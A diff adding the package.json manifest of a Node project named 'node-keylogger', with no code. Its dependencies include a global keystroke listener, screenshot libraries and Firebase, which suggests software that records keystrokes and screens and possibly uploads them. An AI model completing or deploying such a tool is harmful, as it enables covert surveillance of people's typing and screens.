@@ -1,0 +1,23 @@
+{
+  "name": "node-keylogger",
+  "private": true,
+  "version": "0.0.0",
+  "type": "module",
+  "scripts": {
+    "dev": "vite",
+    "build": "vite build",
+    "preview": "vite preview",
+    "start": "node --env-file=.env main.js",
+    "test":"pm2 start main.js"
+  },
+  "devDependencies": {
+    "vite": "^5.1.6"
+  },
+  "dependencies": {
+    "badwords": "^1.0.0",
+    "desktop-screenshot": "^0.1.1",
+    "firebase": "^10.9.0",
+    "node-global-key-listener": "^0.2.0",
+    "node-screenshots": "^0.1.9"
+  }
+}
